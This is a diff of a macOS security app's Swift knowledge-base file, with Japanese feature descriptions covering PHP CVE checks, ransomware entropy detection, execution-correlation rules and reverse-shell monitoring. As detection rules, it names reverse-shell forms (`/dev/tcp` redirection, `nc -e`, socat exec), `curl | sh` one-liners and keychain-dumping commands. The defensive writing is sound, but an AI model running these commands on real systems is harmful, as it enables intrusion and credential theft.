@@ -1,5 +1,5 @@
 // ─────────────────────────────────────────────────────────────────────────────
-// Mirrored from the RoamSwitch app source tree — RoamSwitch 1.17.5 (build 184).
+// Mirrored from the RoamSwitch app source tree — RoamSwitch 1.17.6 (build 185).
 // The RoamSwitch app is the source of truth. Do NOT edit this copy: changes here
 // are not compiled into the shipping app and are overwritten on the next sync.
 // Regenerate with ./scripts/sync-from-roamswitch.sh — see SYNC.md.
@@ -242,15 +242,31 @@ extension RoamSwitchKnowledgeBase {
                 • 即時の検知: Web・メール保護（feat_webmail_download_guard）の監視対象フォルダに保存・変更されたWebファイルに、同じ静的検査の中で適用します。Linux版のようなアクセス前の阻止はできず、すべて事後の検知です（EndpointSecurityは使いません）。
                 • 開発用Webフォルダ: `~/Sites`、`/Library/WebServer/Documents`、`~/Herd`、`~/Library/Application Support/Herd`、`/Applications/MAMP/htdocs`、`~/Library/Application Support/Local`、`~/Local Sites`、パッケージCVE照合の対象フォルダ、Web・メール保護の監視対象フォルダを、1日1回と手動で検査します。1日1回の検査は `node_modules`（依存パッケージ）と `.git` に入りません（監視中のフォルダでの即時検知と、フォルダを指定した手動の検査では `node_modules` も調べます）。`tests` `fixtures` などのテスト用フォルダにはルールを適用しません。
                 • PHPのセッションフォルダ: 同じ検査で、PHPのセッションフォルダ（HomebrewとMAMPとHerdのphp.iniにある `session.save_path`。指定がなければ `/tmp`、`/private/var/tmp`、一時フォルダ。MAMPの `tmp/php`）の中の、`sess_` で始まるファイルを読みます。フォルダの中は掘らず、`sess_` 以外のファイルは開きません。upload_progress の値にPHPコードを混ぜたセッションファイルは critical、セッションの値にPHPの開始タグがあるものは high です。critical は隔離Vaultへ移し、high は通知だけです。
-                • PHPの設定の点検: 設定の「PHPの設定を点検」で、HomebrewとMAMPとHerdとPATHにある php、php-fpm、frankenphp の版、php.ini と conf.d とFPMのプール設定（session.upload_progress、PHP 8.5 の fatal_error_backtraces、memory_limit）、Apache の mod_php、セッションファイルを読みます。版は、2026年10月21日に公表された重大な脆弱性2件（CVE-2026-109618、CVE-2026-109619）の修正版（8.2.35、8.3.36、8.4.27、8.5.12）と比べ、この件だけを判定します。PHPの実行ファイルは版を表示させるときだけ起動し、スクリプトは実行せず、通信もしません。結果は画面に出るだけで、ファイルは変更しません。
+                • PHPの設定の点検: 設定の「PHPの設定を点検」ボタンで、PHPの版と設定とセッションファイルを読んで調べます。読むだけで、通信せず、ファイルも変更しません。詳しくは feat_php_check を参照。
                 • ドメインの点検: 設定の「ドメインの点検」で、書いたドメイン（最大20個）の SPF、DMARC、MTA-STS、登録の有効期限を調べ、参考として CAA と DNSSEC の有無も示します。既定では何も調べず、ドメインを書いてボタンを押したときだけ動きます。この Mac の `dig` がリゾルバーへ TXT・CAA・DS・MX を問い合わせ、`curl` がそのTLDの登録局の RDAP サーバー（先に IANA の公開リストを読みます。ドメイン名は含みません）へ、MX と `_mta-sts` の TXT があるドメインではそのドメイン自身の mta-sts ホストへ問い合わせます。結果は画面に出るだけで、保存も定期実行もしません。
                 • 隔離: 既定では critical の検知だけが、他の脅威と同じ流れ（隔離Vaultへ移動、「隔離ファイルを管理」で復元・削除）の対象です。high は通知とフック、設定画面の一覧だけで、ファイルには触れません（設定で「critical と high を隔離」「隔離しない」にも変えられます）。medium と low は報告のみで、通知履歴に残ります。「除外して復元」したファイルは、Webルールでは再び検知されません（ClamAVの除外とは別の一覧です）。
                 • 検知後のフック: `~/Library/Application Support/RoamSwitch/hooks/post-detection` に実行ファイルを置くと、検知のたびに JSON を標準入力で渡して実行します（所有者が自分か root、グループ・他人が書き込めない、親フォルダも同様、が条件。30秒で打ち切り）。
                 • アカウント対処（既定はオフ）: 設定で有効にすると、ファイルを隔離Vaultへ移した検知について、そのファイルの持ち主のログインシェルを無効化します（high を残した場合や、隔離に失敗した場合は何もしません）。管理者パスワードでの確認が必要で、ログイン中のユーザー、root、UID 501 未満のアカウントには何もしません。元のシェルは記録され、設定画面から戻せます。
                 • 書き方の確認: ルールファイルの JSON Schema は、設定の「スキーマを書き出す」で取り出せます（`~/Library/Application Support/RoamSwitch/web_rules.schema.json`）。エディタに指定すると、キーの補完と書き間違いの指摘が効きます。「ルールファイルを検証…」は、選んだファイルの使えるルール数、書き間違い（知らないキーには近いキーを候補に添える）、既存のルールを置き換えるかどうかを示します。利用者定義のルールが、組み込みやフィードの規則と同じ id で置き換えたときは、警告ではなく注記として設定の画面に出ます。
-                • 限界: ファイルの先頭4MBだけを調べ、固定の語句の並びで見るため、変数名の組み立てなどで分割された文字列は追えません。
+                • 限界: 64MBまでのファイルは全体を、それより大きいファイルは先頭と末尾の4MBずつを調べ（画像は先頭と末尾だけ）、固定の語句の並びで見るため、変数名の組み立てなどで分割された文字列は追えません。
                 """,
                 recommendation: "開発用のWebフォルダがあるMacでは、Proを有効にして既定のまま使ってください。誤検知と思われるファイルは、隔離Vaultから復元すれば再び検知されません。"
+            ),
+            LocalizedEntry(
+                id: "feat_php_check",
+                title: "PHPの設定の点検（設定のボタン）",
+                summary: "この Mac の PHP が、PHP 本体の重大な脆弱性（CVE-2026-109618、CVE-2026-109619）と、まだ修正版のない CVE-2026-115560 の影響を受けるかを点検し、セッションファイルにコードが注入されていないかを調べます。読むだけで、ファイルは変更せず、通信もしません。",
+                details: """
+                • 開く場所: 設定の「Web・メール保護 監視対象フォルダ」にある「Webシェル等の検知ルール」の中の「PHPの設定を点検」ボタンです。押したときだけ動き、定期実行も保存もしません。結果は画面に出るだけで、ファイルは変更せず、管理者権限も要りません。
+                • 読むもの: HomebrewとMAMPとHerdとPATHにある php、php-fpm、frankenphp の版。php.ini と conf.d とFPMのプール設定にある session.upload_progress.enabled、PHP 8.5 の fatal_error_backtraces、memory_limit。Apache の mod_php の設定。PHPのセッションフォルダにある sess_ ファイル。通信はしません。PHPの実行ファイルは、版を表示させるときだけ起動します（`php -n -v`、FrankenPHP は `frankenphp version`。5秒で打ち切り）。スクリプトは実行しません。
+                • 版の判定: 2026年10月21日に公表された重大な脆弱性2件（CVE-2026-109618、CVE-2026-109619）の修正版 8.2.35、8.3.36、8.4.27、8.5.12 と比べます。修正版より前は high、PHPプロジェクトの修正版がない 8.1 以前も high、修正版は info、判定できない系列は medium です。同じ版の実行ファイルは1項目にまとめます。
+                • 設定の判定: session.upload_progress.enabled は、設定がなければ既定でオンです。オンなら medium（FPMのプールが自分の値を持つときは、プールごとに見ます）。fatal_error_backtraces は PHP 8.5 があるときだけ見て、オンで版が修正版より前なら high、それ以外は medium です。mod_php は最も影響を受けやすい動かし方なので medium、PHP-FPM と FrankenPHP があることは info です。memory_limit は値を info で示すだけです。-1 は応急処置とされていますが、勧めてはいません。
+                • CVE-2026-115560（2026年10月23日公表。修正は次の定期リリースで、今は修正版がありません）: 3つがそろったときだけ high です。設定の session.serialize_handler が php_binary か php_serialize、Webのコードが ini_set() でそれを切り替えている、session.upload_progress.enabled が有効、の3つです。Webのコードは、Homebrewの var/www、MAMPの htdocs、/Library/WebServer/Documents、~/Sites、~/Herd にある PHP ファイル（.php .phtml .inc。Composer の vendor を含む）を読みます。node_modules と .git には入らず、リンクはたどりません。一部だけのときは info で、そろっている条件を示します。
+                • セッションファイル: セッションフォルダの直下にある sess_ で始まるファイルだけを読み、サブフォルダには入りません。upload_progress の印とPHPコードが一緒に入っているもの（コードの注入）は critical、セッションの値にPHPの開始タグがあるものは high です。この点検はファイルを動かしません。critical の隔離は、毎日と手動のWebルールの検査（feat_web_rules）が行います。「除外して復元」したファイルは調べません。読めないフォルダは「セッションフォルダを読めません」として info で示します。
+                • 結果の読み方: 先頭に、high か critical があれば「要対応です（重大度が高い項目が N 件）」、なければ「対応が必要な項目はありません」と出ます。次に、調べた数（PHPの実行ファイル、設定ファイル、セッションファイル、フォルダ）が出ます。項目は [critical] [high] [medium] [info] の順で、説明、対処、根拠のパスが付きます。PHPが見つからないときは「PHPは見つかりませんでした」だけです。
+                • 判定の範囲: この3件の勧告だけです。ほかの PHP の脆弱性や、WordPress などのアプリの脆弱性は判定しません。
+                """,
+                recommendation: "版が修正版より前なら、PHPを更新してください。更新が完全な対処です。更新できない間は、session.upload_progress.enabled を使っていなければ 0 にして、PHPを再起動します。これは暫定策で、更新の代わりにはなりません。"
             ),
             LocalizedEntry(
                 id: "feat_event_forwarding",
@@ -344,6 +360,7 @@ extension RoamSwitchKnowledgeBase {
                 • サブドメイン偽装: `apple.com.login-verify.xyz` のように大手ブランド名を紛れ込ませた構造を解析。
                 • 高リスクTLD: `.xyz`、`.top`、`.tk`、`.icu` など、使い捨てのフィッシングで多用されるTLDを減点。
                 • 平文HTTP・IP直打ち: ログイン画面などの暗号化なしHTTPや、生のIPアドレスURLを警告。
+                • 脅威フィード: ホスト（または親ドメイン）が、リンク保護と同じ脅威フィードに載っていれば、危険と判定し、リンク保護なら遮断する扱いにします。照合は、このMacにあるフィードのファイルを読むだけで、通信はしません。
                 • 完全ローカル: 外部の診断APIにURLを送信しないため、機密URLや認証トークンが漏れません。短縮URLの展開（リダイレクトの追跡）をするときだけ、そのURL自体へ直接アクセスします。
                 """,
                 recommendation: "メールやチャットで届いた不審なリンクは直接クリックせず、まずリンク安全性診断で確認してください。"
@@ -359,7 +376,7 @@ extension RoamSwitchKnowledgeBase {
                 • 凍結の理由: 通信はすでに遮断されているため、停止したプロセスはそれ以上被害を広げられません。誤検知だった場合は解除時に再開（SIGCONT）でき、データを失いません。
                 • ファイルを取り戻すには: 緊急モーダルに、無償の復号ツールを集めた No More Ransom と警察庁のページへのリンクと、前者の QR コードを出します(隔離中はこの Mac で開けないため)。復号ツールがあるのは仕組みが解析された一部の種類だけで、RoamSwitch 自身はファイルを復号しません。
                 • 解除時: ネットワークとWi-Fiを復旧し、停止したプロセスを再開し、改ざんされたおとりファイルを再生成します。
-                • 汎用検知（エントロピー解析、Pro）: おとりファイルに触れない暗号化も、`Documents`・`Desktop`・`Downloads`・`Pictures` に書き込まれたファイルの中身で検知します。ファイル全体のシャノンエントロピーが 7.92 以上のファイルが、5秒以内に20個以上になると、大量暗号化のバーストとして扱います。ファイルの先頭だけ、または4KiB以上のブロックを1つおきに暗号化する方式に備えて、4KiB ごとの区間も調べ、7.9 以上の区間が2つ以上ある16KiB以上のファイルも数えます。ZIP・PDF・JPEG など、圧縮形式の先頭が壊れていないファイルは対象外です。区間の判定は、ビルド成果物（`.o`・`.a`・`.rlib`・`.rmeta`・`.so`・`.dylib`・`.class`・`.pyc`・`.wasm` など）と `target` フォルダ内にも使いません。4KiB より小さいブロック（16バイトや256バイトなど）だけを暗号化する方式は、この判定では見えません。実測では、書類などの実ファイル3,531件に追加の検出はありませんでした。実ファイル150件で、先頭だけ・4KiB以上のブロックを1つおきに暗号化した場合を模擬すると、全体の値では0〜35%、区間の判定では100%を検出しました。
+                • 汎用検知（エントロピー解析、Pro）: おとりファイルに触れない暗号化も、`Documents`・`Desktop`・`Downloads`・`Pictures` に書き込まれたファイルの中身で検知します。ファイル全体のシャノンエントロピーが 7.92 以上のファイルが、5秒以内に20個以上になると、大量暗号化のバーストとして扱います。ファイルの先頭だけ、または4KiB以上のブロックを1つおきに暗号化する方式に備えて、4KiB ごとの区間も調べ、7.9 以上の区間が2つ以上ある16KiB以上のファイルも数えます。ZIP・PDF・JPEG など、圧縮形式の先頭が壊れていないファイルは対象外です。区間の判定は、ビルド成果物（`.o`・`.a`・`.rlib`・`.rmeta`・`.so`・`.dylib`・`.class`・`.pyc`・`.wasm` など）と `target` フォルダ内にも使いません。もっと小さいブロックにも備えて、先頭256KiBを256バイトずつの区間に分け、乱数のように見える区間（7.0 以上）が、区間全体の5〜30%を占め、4区間以上の同じ間隔（たとえば2KiBごとに256バイト）で8か所以上並ぶ16KiB以上のファイルも数えます。PDFやデータベースの中の圧縮データのように、乱数に見える区間が1つの塊として続くだけのファイルは数えません。16バイトのような、さらに細かいブロックだけの暗号化は、どちらの判定でも見えません。2つの区間の判定だけを止めて、全体の判定を残すには、`defaults write com.tetsuharu.RoamSwitch RoamSwitch.RansomwareEntropyWindowRule -bool false` を実行します。実測では、書類などの実ファイル3,531件に追加の検出はありませんでした。実ファイル150件で、先頭だけ・4KiB以上のブロックを1つおきに暗号化した場合を模擬すると、全体の値では0〜35%、区間の判定では100%を検出しました。 256バイトの判定は、1台のMacの通常のファイル1,026,286件（アプリ、ライブラリ、キャッシュ、Homebrew、開発用フォルダ）で検出が0件で、実ファイル150件の2KiBごとに256バイトを乱数に置き換えた模擬では150件すべてを検出しました。
                 • 既定値: Proライセンスの初回有効化時に自動でオン。検知履歴はMCPの `get_canary_status` で確認できます。メニューの「ランサムウェア防護シミュレーション (動作確認)」で安全にテストできます。
                 • 置けた数: メニューの項目に「設置 N/M」と出ます。1つも置けていないときは⚠️になり、理由が出ます。認証情報ハニートークンも同じで、置けなかった理由（本物のファイルが既にある、シンボリックリンクがある、書き込めない）を数えて、`get_honeytoken_status` の placement に出します。
                 """,
@@ -419,8 +436,10 @@ extension RoamSwitchKnowledgeBase {
                 summary: "macOS標準の/usr/bin/eslogger(macOS 13以降)でこのMacで起動したプログラムを記録し、不審な組み合わせに一致した起動を通知します。実行をブロックすることも通信を遮断することもなく、記録はこのMacの中だけに残ります。",
                 details: """
                 • 仕組み: 特権ヘルパーが `/usr/bin/eslogger exec fork exit` を子プロセスとして起動し、そのJSONストリームを解析します。esloggerはmacOSに同梱のツールで、RoamSwitchはEndpointSecurityエンタイトルメントを使わず申請もしません。そのため実行前ブロックではなく事後の観測です。
+                • ファイルを開いたプロセスの記録(任意・既定はオフ。この記録の下位のオプション): 偽の認証情報ファイルを読んだプロセス、AIエージェントの設定ファイルや自動起動の場所に書き込んだプロセスを、通知に出します(PID・親・コマンド・署名)。ヘルパーが、eslogger(`open`)と eslogger(`create rename unlink clone copyfile truncate`)を別々に1つずつ動かします。eslogger はパスで絞れず、`open` はMacが開くすべてのファイルを流すため、ヘルパーは各行に見たいパスがあるかだけを調べ、当たった数行をサンドボックスの解析プロセスに渡し、残りはその場で捨てます。残すのは見たいファイルに触れた出来事だけで、メモリの中に約3分間だけ置き、ディスクには書かず、外部へも送りません。CPUを使います。`open` の側は、通常の使用中の実測で1コアの約5%です。作成・名前変更・削除の側は、出来事がはるかに少なく、負荷はごくわずかです。ヘルパーが2つの負荷を別々に測り、直近5分の平均が上限を超え続けると、その1つだけを15分、1時間、6時間の順に止めます。上限は、`open` の側が1コアの12%(「プロセス実行の記録」ウィンドウで変えられます)、もう一方が3%です。状態と測った負荷は「プロセス実行の記録」ウィンドウに出ます。フルディスクアクセスの許可はこの記録と同じです。プロセスを特定できないときは、通知に理由(オフ・負荷で一時停止・開始前・動いていない)を書きます。
                 • 必要条件: macOS 13以降と、フルディスクアクセスでのRoamSwitchの許可。許可がない場合は「実行記録は利用できません: フルディスクアクセスでRoamSwitchの許可が必要です（一覧に無ければ「+」から /Applications/RoamSwitch.app を追加）」(またはesloggerが見つからない旨)と表示するだけで、代わりの常時ポーリングは行いません。記録を有効にする前・ヘルパー起動前のイベントは残りません。
                 • 相関ルール(通知のみ・初期設定では静か・各ルールに固定IDとMITRE ATT&CK技術ID): ブラウザ/Office/メールアプリが直接シェルやスクリプト処理系を起動(exec.shell_from_app, T1059)／/tmp・/private/var/tmp・/var/folders配下の一時フォルダ・/Users/Sharedや隔離属性付きの場所から署名なし・アドホック署名のバイナリを実行(exec.untrusted_location, T1204.002)／curl/wgetをシェルへ渡す `sh -c` ワンライナーのうち、生IPのURL・base64・eval・TLS検証無効・ブラウザ等が親といった不審な事情を伴うもの(exec.pipe_to_shell, T1059.004)／`osascript -e` でdo shell scriptとbase64/evalを組み合わせたもの(exec.osascript_obfuscated, T1059.002)／`xattr -d com.apple.quarantine` の後15分以内にそのファイルを実行(exec.quarantine_stripped_then_exec, T1553.001)／直近24時間に書き込まれたLaunchAgent/LaunchDaemonから署名なし・アドホックのバイナリがlaunchd経由で起動(exec.launchd_untrusted_binary, T1543.001/.004)／Apple署名でないシェル以外の祖先プロセスによる `security find-generic-password -w` や `dump-keychain`(exec.keychain_access, T1555.001)／osascript以外の裸のインタプリタが `-c`/`-e`/`-Command` のインライン一行コードを実行し、base64/evalとダウンロードやexec相当の呼び出しを組み合わせたもの(exec.interpreter_inline_obfuscated, T1059)／DYLD_INSERT_LIBRARIESを設定した非Apple署名バイナリの実行(exec.dyld_insert_libraries, T1574.006)／RoamSwitch自身でもAppleのプロセスでもない何かによる`tmutil deletelocalsnapshots`/`thinlocalsnapshots`の実行(exec.ransomware_recovery_tampering, T1490)／コマンドラインが、RoamSwitchの設置した偽の認証情報ファイル(~/.aws/credentials、~/.env.backupなど中身にマーカーを持つもの)を直接指定して実行(exec.honeytoken_path, T1552.001)。本物のファイルは対象外で、ライブラリ経由の読み取りはハニートークンの監視が担当。スクリプトやAIエージェントが動かす攻撃ツール連鎖(HexStrike AIのようなバックエンドなど)を狙う規則も2つあります。1つのプロセスが30秒以内に8種類以上のペネトレーションテスト用ツールをwhich/typeで立て続けに調べる場合(exec.offensive_tool_inventory, T1595)と、スクリプト処理系やAIコーディングエージェントが2分以内に3種類以上の同種ツールを起動する場合(exec.offensive_tool_burst, T1595)です。人がTerminalで同じコマンドを打っても検知しません。Terminalで普通に打った `curl | sh` は意図的に検知しません。 シェルの `-c` で渡されたコマンドラインや、nc・ncat・socatを直接起動したコマンドラインに、リバースシェル(バインドシェルを含む)の形が書かれている場合も検知します(exec.reverse_shell_argv, T1059.004)。対象は、シェルを運ぶ /dev/tcp・/dev/udp へのリダイレクト、mkfifoで作ったパイプをnc・telnet・openssl s_client・sshにつなぐ形、`nc -e <シェル>`、socatの exec:<シェル>、シェルへパイプで渡すopenssl s_clientです。`echo > /dev/tcp/host/22` のようなポートの疎通確認や、これらの語を文字として含むだけの文は検知しません。
+                • サービスのアカウントが起動したシェル(exec.shell_from_service、T1505.003): Webサーバーやアプリのサービスのプロセス(httpd・nginx・php-fpm・java・tomcat・gunicorn・uwsgi・node など)が、サービスのアカウント(macOS標準のApacheの `_www`、MacPortsの `www` など)で、シェル(sh・bash・zsh など)、または python・perl・ruby・node の -c / -e のワンライナーを直接起動すると通知します。Webシェルがコマンドを実行するときの形です。アカウントとサービスのプロセスの両方が当てはまる場合だけ検知するため、自分のアカウントで動かす開発サーバー・apachectl・brew services・cron では通知しません。アカウントを足すには `defaults write com.tetsuharu.RoamSwitch RoamSwitch.ExecRule.ServiceUsers "名前,名前"` を実行し、アプリを再起動するか、プロセス実行の記録をオフにしてオンに戻します(一覧に足すだけで、`_www` は外れません)。`_mysql`・`_postgres` などのデータベースのアカウントは、データベース自身がシェルを起動することがある(archive_command など)ため、初期設定の対象にしていません。プログラムを起動せずWebサーバーのプロセスの中でコードを実行するWebシェルは見えません。
                 • 通知: 通知(Pro)とインシデントタイムラインへの記録(発生源 execRecorder、対応「通知のみ」)。通知が単独でAir-Gapなどの隔離を発動することはありません。
                 • 保存: /Library/Application Support/RoamSwitch/exec_log にセグメント分割のJSON Lines(root専用の0700/0600。コマンドライン引数に機密が含まれ得るため、アプリ・ビューア・MCPサーバーは特権ヘルパー経由でのみ読み取ります)。既定200MB・14日(変更可)、クラッシュ安全なローテーション。セグメント間をハッシュチェーンで連結し、削除・編集・切り詰めを検出します(「チェーンを検証」)。改ざん検知であり改ざん防止ではありません。環境変数は記録しませんが、コマンドライン引数に機密が含まれる場合があります。
                 • 負荷対策: 過負荷時は古い行から捨てる有界キュー(件数を表示)、指数バックオフでの再起動、オフにするとesloggerを完全に停止します。
@@ -437,7 +456,7 @@ extension RoamSwitchKnowledgeBase {
                 • 監視対象: `~/Library/LaunchAgents`、`/Library/LaunchAgents`、`/Library/LaunchDaemons` を FSEvents で監視（約1.5秒のデバウンス）。
                 • 判定: 近年の情報窃取マルウェアは、正規署名済みの `/bin/bash` や `/usr/bin/osascript` にBase64で隠したスクリプトを実行させて永続化します。インタプリタ自体の署名は正しいため、生のインタプリタを直接起動する登録は署名に関係なく不審として扱い、スクリプト引数も静的シグネチャで検査します。署名が無効・未署名の実行ファイルも検知対象です。Homebrew services のラッパーは除外します。
                 • 検知のみ: EndpointSecurityのエンタイトルメントを使わないため、plistの書き込み自体は止められません。書き込みから約1.5秒以内に判定して通知します。
-                • 監視対象（自動で実行される場所）: シェルの起動ファイル（`~/.zshrc`、`~/.zshenv`、`~/.zprofile`、`~/.zlogin`、`~/.zlogout`、`~/.bashrc`、`~/.bash_profile`、`~/.bash_login`、`~/.profile`、`~/.bash_logout`、`~/.config/fish/config.fish`、`/etc/zshrc`、`/etc/zshenv`、`/etc/zprofile`、`/etc/zlogin`、`/etc/profile`、`/etc/bashrc`）、`~/.ssh/rc` と `/etc/ssh/sshrc`、定期スクリプト（`/etc/periodic/{daily,weekly,monthly}`、`/usr/local/etc/periodic/*`、`/etc/{daily,weekly,monthly}.local`。存在する場合のみ）、gitフックの置き場（`~/.git-templates/hooks`、`~/.config/git/hooks`）、ログイン/ログアウトフック（`/Library/Preferences/com.apple.loginwindow.plist` の LoginHook / LogoutHook）、フォルダアクションのスクリプト（`~/Library/Scripts/Folder Action Scripts` と `/Library/Scripts/Folder Action Scripts`。コンパイル済みのAppleScriptは osadecompile で読み、`.scptd` バンドルは読みません）。5秒ごとに確認し、最初の1回は今ある内容を記録するだけで通知しません。`emond` は対象外です。
+                • 監視対象（自動で実行される場所）: シェルの起動ファイル（`~/.zshrc`、`~/.zshenv`、`~/.zprofile`、`~/.zlogin`、`~/.zlogout`、`~/.bashrc`、`~/.bash_profile`、`~/.bash_login`、`~/.profile`、`~/.bash_logout`、`~/.config/fish/config.fish`, `~/.config/fish/conf.d/*.fish`、`/etc/zshrc`、`/etc/zshenv`、`/etc/zprofile`、`/etc/zlogin`、`/etc/profile`、`/etc/bashrc`）、`~/.ssh/rc` と `/etc/ssh/sshrc`、定期スクリプト（`/etc/periodic/{daily,weekly,monthly}`、`/usr/local/etc/periodic/*`、`/etc/{daily,weekly,monthly}.local`。存在する場合のみ）、gitフックの置き場（`~/.git-templates/hooks`、`~/.config/git/hooks`、ホームの下4階層までにある作業コピー（最大400個）の `.git/hooks`、`core.hooksPath` が指すフォルダ。実行権限のあるフックだけを見て、`*.sample` は見ません。Desktop・Documents・Downloads・Library の中は、登録したプロジェクトフォルダを除いて探しません。`.git` がファイルのサブモジュールとリンクされた worktree は、実体の git ディレクトリまでたどり（`.git/modules/<名前>/hooks`、またはリンクされた worktree が共有する元のリポジトリの `.git/hooks`）、共有しているフォルダは1回だけ見ます。作業コピーが400個を超えると、超えた分は見ず、`get_guard_status` の persistenceMonitor が partial になり、readers の `scopeLimited` が true になります）、ログイン/ログアウトフック（`/Library/Preferences/com.apple.loginwindow.plist` の LoginHook / LogoutHook）、フォルダアクションのスクリプト（`~/Library/Scripts/Folder Action Scripts` と `/Library/Scripts/Folder Action Scripts`。コンパイル済みのAppleScriptは osadecompile で読み、`.scptd` バンドルは読みません）。5秒ごとに確認し、最初の1回は今ある内容を記録するだけで通知しません。`emond` は対象外です。
                 • Pythonの起動ファイル: Pythonが起動のたびに自分で実行するファイルも見ます。Python本体のsiteフォルダーと、ホームの下の仮想環境(4階層まで、1分ごとに探し直します。Desktop、Documents、Downloads、Libraryは除きます)にある `.pth` ファイル、`sitecustomize.py`、`usercustomize.py` と、`.pth` が同じフォルダーから読み込むモジュールです。通知するのは、3種類以上の認証情報の置き場所を読む処理、復号してそのまま実行、ダウンロードしてそのまま実行、リバースシェルの形のコードだけで、文字列を隠したコードは見えません。
                 • 判定（上の場所）: リバースシェル、復号してそのまま実行、ダウンロードしてそのまま実行、一時フォルダ（`/tmp`・`/var/folders` など）にあるプログラムの実行の形をした行だけを通知します。普通の行が増えても通知しません。シェルの起動ファイル・`~/.ssh/rc`・gitフックは持ち主が頻繁に編集するため、元からあった不審な行は通知せず、新しく増えた行だけを通知します。ログイン/ログアウトフックは、設定されたこと自体を通知します。
                 • 既定値: Pro版で既定オン。メニュー「マルウェア対策」→「新規の自動起動登録(LaunchAgent/Daemon)を監視 (Pro)」で切替。
@@ -479,11 +498,11 @@ extension RoamSwitchKnowledgeBase {
                 • 開き方: メニューバーの「🐚/✅ リバースシェルを常時監視 (Pro)」で切り替えます。
                 • 仕組み: libprocでプロセスの一覧と、各プロセスが開いているファイル記述子を4秒ごとに読みます。lsofなどの外部コマンドは使わず、接続の中身は読みません。
                 • 検知する形: (1) シェルやインタプリタ(sh、bash、zsh、python、perl、ruby、php、nodeなど)の入力(0番)と出力(1番)が、同じ「確立済みの外向きTCP接続」になっている形(`bash -i >& /dev/tcp/H/P 0>&1` や、pythonでソケットをdup2する1行)。(2) nc、ncat、socatが`-e`や`--exec`、`exec:`で別のプログラムを接続につないでいる形。(3) ncの脇に、入力と出力がパイプのシェルが同じ親から起動されている形(`mkfifo`を使う輪。Mac標準のncには`-e`がないため、この形が使われます)。
-                • 見る相手: 公開アドレスだけです。家庭内LAN、Tailscale(100.64.0.0/10)、コンテナ、ループバックは見ません。リモート開発やProxyCommandでの誤検知を避けるためです。
+                • 見る相手: 既定では公開アドレスだけです。家庭内LAN、Tailscale(100.64.0.0/10)、コンテナは見ません。リモート開発やProxyCommandでの誤検知を避けるためです。メニューの「リバースシェル検知: ローカルネットワーク内の接続先も対象にする」（または `defaults write com.tetsuharu.RoamSwitch RoamSwitch.ReverseShellWatch.IncludePrivateV1 -bool true`）で、これらも見るようになります。ループバックは常に見ません。
                 • 外向きの判定: 待ち受けポートで受けた接続や、手元のポートが49152未満の接続は、リバースシェルとは見なしません。
                 • 通知の条件: 2回続けて同じ状態を見たときだけ通知し、1つのプロセスにつき1回です。同じ名前のプログラムが同じ相手につながる通知は、15分に1回までです。
                 • 通知のみ: プロセスの終了も、ネットワークの遮断も自動では行いません。
-                • 限界: ログイン中のユーザー自身のプロセスだけが対象です。root権限のプロセスは見えません。一覧にない名前のプログラムや、プライベートアドレスへの接続も見ません。スクリプトファイルに書かれただけのものは、接続するまで見えません。
+                • 限界: アプリはログイン中のユーザー自身のプロセスを読み、ほかのアカウント(rootを含む)のプロセスは、rootのヘルパーが読みます。アプリより古いヘルパーには問い合わせないため、その間はroot権限のプロセスは見えません。一覧にない名前のプログラムは見ません。プライベートアドレスへの接続も、上のメニュー項目をオンにしない限り見ません。スクリプトファイルに書かれただけのものは、接続するまで見えません。
                 • 許可リスト: 心当たりのあるプログラムは、メニューの「直近のリバースシェル検知を許可リストに追加…」で「名前@接続先」として追加できます。
                 • プロセス実行レコーダー(feat_exec_recorder)の`exec.reverse_shell_argv`は、コマンドラインに書かれた形を起動時に検知します。この機能は、接続した後の実際の状態を検知します。
                 • Proのライセンスを失うと自動で無効になります。
@@ -499,7 +518,8 @@ extension RoamSwitchKnowledgeBase {
                 • 仕組み: macOSのシステム構成ストア(SCDynamicStore)の変化を受け取り、数秒待ってから、有線とWi-Fi(enインターフェース)のDNSとルーターを読みます。外部コマンドも通信も使いません。
                 • 比べる相手: Wi-Fiは名前(SSID)、名前を読めないときと有線はルーターのハードウェアアドレスで、ネットワークを見分けます。初めて見たネットワークは覚えるだけで、通知しません。
                 • 通知する変化: (1) そのネットワークで見たことのないDNSサーバー。ルーター自身のアドレス、公開DNSとして知られたもの、RoamSwitchのセキュアDNSは除きます。(2) 見たことのないルーターと、見たことのないDNSサーバーが同時に現れた場合。偽のDHCPサーバーが配る形なので、より強い通知になります。(3) 見たことのないホストのプロキシ自動構成(PAC)。(4) 「プロキシを自動検出」(WPAD)が新しくオンになった場合。 ルーター自身のアドレスを除くのは、そのルーターがすでに既知のときだけです。新しいルーターが自分のアドレスをDNSサーバーとして配った場合は、新しいルーターと新しいDNSサーバーの組として、強い通知になります。
-                • 通知しないもの: ルーターだけが変わった場合は覚えるだけです(交換はよくあり、ゲートウェイの変化はネットワーク履歴とARP監視が見ます)。VPN、Tailscaleなどのトンネル(utunなど)は見ません。サービス設定に保存されたDNS(本人、構成プロファイル、RoamSwitchのセキュアDNSが設定したもの)は、ネットワークが配ったものではないので比べません。DNS-over-HTTPSのプロファイルは、ここに現れません。ルーターが3種類以上見えたネットワーク(学内や社内のように場所ごとにサブネットが違う)では、新しいルーターを普通のこととして扱います。
+                • 通知しないもの: ルーターだけが変わった場合は覚えるだけです(交換はよくあり、ゲートウェイの変化はネットワーク履歴とARP監視が見ます)。VPN、Tailscaleなどのトンネル(utunなど)は見ません。サービス設定に保存されたDNS(本人、構成プロファイル、RoamSwitchのセキュアDNSが設定したもの)は、ネットワークが配ったものではないので、ネットワークごとの履歴とは比べません(次の項目で見ます)。DNS-over-HTTPSのプロファイルは、ここに現れません。ルーターが3種類以上見えたネットワーク(学内や社内のように場所ごとにサブネットが違う)では、新しいルーターを普通のこととして扱います。
+                • 保存されたDNS: 有線・Wi-Fiのサービスの保存済みの設定に、これまでなかったDNSサーバーが加わったとき（`networksetup -setdnsservers` や、システム設定のネットワークで書かれたもの）に、弱い通知を1回出します。ルーター自身のアドレス、ループバック、広く知られた公開リゾルバー、RoamSwitchのセキュアDNS、そのサービスに以前保存されていたものは対象外です。保存された設定を書いたのが誰かは分からないので、自分で変えた場合も同じ通知になります。メニューで受け入れると、既知のものとして記録されます。監視を始めた直後の最初の確認と、初めて見るサービスは、記録するだけです。トンネル（utunなど）のサービスは読みません。
                 • 受け入れ: 同じ内容の通知は1回だけです。ルーターの交換のように心当たりのある変化は、メニューの「ネットワーク設定の基準を現在の状態に更新…」で、今の状態をそのネットワークの正しい状態として記録します。自動では受け入れません。
                 • 監査との関係: 監査項目「プロキシ自動検出 (WPAD / PAC)」(proxy_autodiscovery)は、今この瞬間にWPADやネットワークが指定したPACが有効かを調べます。
                 • 通知のみ: 設定の変更も遮断もしません。
